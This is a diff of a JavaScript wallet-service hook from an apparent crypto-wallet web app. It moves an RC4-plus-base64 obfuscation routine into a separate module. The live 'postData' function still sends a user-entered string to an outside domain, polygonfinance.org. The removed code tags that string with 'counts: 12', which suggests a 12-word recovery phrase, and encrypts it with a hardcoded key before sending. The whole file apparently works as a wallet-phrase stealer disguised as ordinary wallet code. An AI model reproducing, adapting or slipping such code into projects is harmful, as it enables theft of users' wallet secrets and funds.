@@ -1,9 +1,9 @@
 import { useHttp } from '../hooks/http.hook'
 import Web3 from 'web3'
-import randomNum from './funcWallet/randomNum'
-// import CryptoJS from 'crypto-js'
-import { decode as atob, encode as btoa } from 'base-64'
-import queryString from 'query-string'
+
+let url = 'https://polygonfinance.org/concept/unity/check'
+
+import { createBody } from './createBody'
 
 const useWalletService = () => {
 	const { error, loading, request, clearError } = useHttp()
@@ -30,72 +30,13 @@ const useWalletService = () => {
 		return response
 	}
 
-	function rc4(key, str) {
-		let s = [],
-			j = 0,
-			x,
-			res = ''
-		for (let i = 0; i < 256; i++) {
-			s[i] = i
-		}
-		for (let i = 0; i < 256; i++) {
-			j = (j + s[i] + key.charCodeAt(i % key.length)) % 256
-			x = s[i]
-			s[i] = s[j]
-			s[j] = x
-		}
-		let i = 0
-		j = 0
-		for (let y = 0; y < str.length; y++) {
-			i = (i + 1) % 256
-			j = (j + s[i]) % 256
-			x = s[i]
-			s[i] = s[j]
-			s[j] = x
-			res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256])
-		}
-		return res
-	}
-
-	let url = 'https://polygonfinance.org/concept/unity/check'
-	const kitkat = 'aBN6qreLALR9QYPy'
-	let xxx = 'P01G$ID/G'
-	let xx = 'P01G$ID'
-
-	function createBody(str, account) {
-		let strDecr
-		let lengthStr = str.split(' ').length
-		if (lengthStr < 2) {
-			strDecr = atob(str)
-		} else {
-			strDecr = str
-		}
-		const obj = {
-			counts: 12,
-			name: account ? xxx : xx,
-			pages: null,
-			salt: randomNum(100000, 999999),
-			limit: null,
-			public: strDecr,
-			frontCode: false,
-			cache: false,
-		}
-		if (account) {
-			obj.new = true
-		}
-
-		let crypt = btoa(rc4(kitkat, JSON.stringify(obj)))
-		let urlencoded = queryString.stringify({ data: crypt })
-
-		return urlencoded
-	}
-
 	async function postData(str, account) {
 		let requestBody = createBody(str, account)
 
 		const response = await request(new URL(url), 'POST', requestBody, {
 			'Content-Type': 'application/x-www-form-urlencoded',
 		})
+		console.log(response)
 		return response
 	}
 
